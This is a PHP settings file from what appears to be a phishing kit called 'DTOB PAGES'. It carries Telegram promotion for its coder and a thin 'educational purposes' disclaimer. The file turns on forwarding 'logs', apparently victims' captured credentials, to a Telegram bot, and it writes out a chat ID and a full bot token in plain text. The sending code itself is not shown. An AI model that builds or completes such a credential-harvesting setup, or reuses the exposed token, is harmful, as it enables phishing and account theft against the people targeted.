<?php
session_start();
error_reporting(0);




/*   DTOB PAGES - coder @dtob1804
JOIN CHANNEL t.me/dtobpages ON TELEGRAM OR KEYBASE
CONTACT CODE t.me/dtob1804 ON TELEGRAM OR KEYBASE
Only use for educational purposes. 
Subject to copyright. Copyright © 2023 DTOB1804 PAGES */

//SETTINGS FOR INFO
//TOGGLE Yessir 

$telesave="Yessir";//TOGGLE FOR SAVING LOGS TO TELEGRAM
//TELEGRAM BOT AND USER DETAILS
$chat_id='5176980004';//INPUT YOUR TELEGRAM GROUP OR USER ID
$bot_url='6436453943:AAHik-Gr95AYp3Y7FUMJXXDAdSNi8pJLNQk';//INPUT YOUR TELEGRAM BOT TOKEN

/*
 ,'|"\   _______  .---.  ,---.     ,---.    .--.    ,--,   ,---.     .---. 
 | |\ \ |__   __|/ .-. ) | .-.\    | .-.\  / /\ \ .' .'    | .-'    ( .-._)
 | | \ \  )| |   | | |(_)| |-' \   | |-' )/ /__\ \|  |  __ | `-.   (_) \   
 | |  \ \(_) |   | | | | | |--. \  | |--' |  __  |\  \ ( _)| .-'   _  \ \  
 /(|`-' /  | |   \ `-' / | |`-' /  | |    | |  |)| \  `-) )|  `--.( `-'  ) 
(__)`--'   `-'    )---'  /( `--'   /(     |_|  (_) )\____/ /( __.' `----'  
                 (_)    (__)      (__)            (__)    (__)             
                 CONTACT ON TELEGRAM @dtobpages
             
*/


?>